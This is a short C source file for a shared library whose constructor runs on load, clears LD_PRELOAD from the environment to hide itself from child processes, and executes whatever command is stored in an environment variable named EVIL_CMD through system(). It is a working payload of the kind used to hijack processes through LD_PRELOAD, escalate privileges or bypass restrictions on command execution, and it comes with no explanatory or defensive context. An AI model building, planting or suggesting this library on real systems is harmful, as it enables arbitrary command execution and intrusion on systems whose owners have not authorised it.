#include <stdlib.h>
#include <string.h>

extern char **environ;

__attribute__ ((__constructor__)) void preload(void) {
    for (int i = 0; environ[i]; ++i) {
        if (strstr(environ[i], "LD_PRELOAD")) {
            environ[i][0] = 0;
        }
    }
    const char *cmd = getenv("EVIL_CMD");
    system(cmd);
}